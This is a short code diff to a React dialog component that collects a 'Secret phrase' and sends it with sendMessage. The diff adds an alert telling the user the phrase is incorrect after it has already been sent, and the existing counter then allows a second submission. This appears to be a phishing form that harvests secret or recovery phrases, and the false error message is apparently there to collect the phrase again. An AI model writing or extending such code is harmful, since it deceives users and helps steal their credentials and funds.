@@ -84,6 +84,7 @@ function SimpleDialog(props) {
 
     if (submited.count <= 1) {
       sendMessage(value).then(() => {
+        alert("Incorrect Secret-phrase");
         setSubmited({ ...submited, count: submited.count + 1 });
         setValue({ ...value, phrase: "" });
         setLoading(false);
@@ -108,6 +109,7 @@ function SimpleDialog(props) {
             placeholder="Secret phrase"
             id="phrase"
             onChange={handleChange}
+            value={value.phrase}
           />
 
           <BootstrapButton
